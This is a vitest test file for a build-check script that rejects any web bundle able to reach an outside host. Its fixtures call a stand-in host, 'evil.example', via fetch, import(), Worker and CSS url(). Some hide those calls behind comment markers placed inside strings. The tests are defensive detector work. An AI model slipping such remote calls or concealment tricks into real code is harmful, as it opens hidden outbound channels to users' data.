import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

// The build check must fail on any request that could leave the machine. The
// built JS is a few very long lines, so these cases put the URL on the same
// line as things that used to hide it.

const script = join(process.cwd(), 'scripts/check-build.mjs');
let dir = '';

afterEach(() => {
  if (dir) rmSync(dir, { recursive: true, force: true });
  dir = '';
});

function check(files: Record<string, string>) {
  dir = mkdtempSync(join(tmpdir(), 'check-build-'));
  for (const [name, text] of Object.entries(files)) {
    mkdirSync(join(dir, name, '..'), { recursive: true });
    writeFileSync(join(dir, name), text);
  }
  const r = spawnSync(process.execPath, [script, dir], { encoding: 'utf8' });
  return { ok: r.status === 0, out: r.stdout + r.stderr };
}

describe('check-build', () => {
  it('passes a build with no external URL', () => {
    const r = check({
      'index.html': '<!doctype html><script src="/assets/a.js"></script>',
      'assets/a.js': 'var ns="http://www.w3.org/2000/svg";fetch("/api/projects");var p="a//b";',
      'assets/a.css': '.a{background:url(/assets/x.woff2)}',
    });
    expect(r.out).toContain('no external URLs');
    expect(r.ok).toBe(true);
  });

  it("allows the link in marked's error message, and nothing else on that site", () => {
    const ok = check({ 'assets/a.js': 'var m="Please report this to https://github.com/markedjs/marked.";' });
    expect(ok.ok).toBe(true);
    const bad = check({ 'assets/a.js': 'fetch("https://github.com/markedjs/marked/raw/x")' });
    expect(bad.ok).toBe(false);
  });

  it('fails a plain URL in JS', () => {
    const r = check({ 'assets/a.js': 'fetch("https://evil.example/x")' });
    expect(r.ok).toBe(false);
    expect(r.out).toContain('https://evil.example/x');
  });

  it('fails a URL that follows a /* inside a string on the same line', () => {
    const r = check({ 'assets/a.js': 'var a="/*";var b=1;fetch("https://evil.example/after-star");' });
    expect(r.ok).toBe(false);
    expect(r.out).toContain('https://evil.example/after-star');
  });

  it('fails a URL that follows a // inside a string on the same line', () => {
    const r = check({ 'assets/a.js': 'var a=" // ";fetch("https://evil.example/after-slashes");' });
    expect(r.ok).toBe(false);
    expect(r.out).toContain('after-slashes');
  });

  it('does not exempt a URL in a JS comment either', () => {
    const r = check({ 'assets/a.js': '/* see https://evil.example/doc */ var a=1;' });
    expect(r.ok).toBe(false);
  });

  for (const call of ['fetch', 'import', 'new URL', 'new Request', 'new EventSource', 'new Worker']) {
    it(`fails a protocol-relative host after ${call}(`, () => {
      const r = check({ 'assets/a.js': `${call}("//evil.example/x")` });
      expect(r.ok).toBe(false);
      expect(r.out).toContain('//evil.example/x');
    });
  }

  it('fails a protocol-relative host in a plain string, a template and a CSS url()', () => {
    expect(check({ 'assets/a.js': 'var u="//cdn.example.com/lib.js"' }).ok).toBe(false);
    expect(check({ 'assets/a.js': 'fetch(`//evil.example/${x}`)' }).ok).toBe(false);
    expect(check({ 'assets/a.css': '.a{background:url(//evil.example/x.png)}' }).ok).toBe(false);
  });

  it('keeps allowing a URL inside a CSS or HTML comment', () => {
    const r = check({
      'assets/a.css': '/* licence: https://example.org/licence */ .a{color:red}',
      'index.html': '<!-- https://example.org/note --><div></div>',
    });
    expect(r.ok).toBe(true);
  });

  it('does not let a CSS comment marker inside a string hide a later URL', () => {
    const r = check({ 'assets/a.css': '.a::after{content:"/*"}.b{background:url(https://evil.example/x.png)}' });
    expect(r.ok).toBe(false);
  });
});
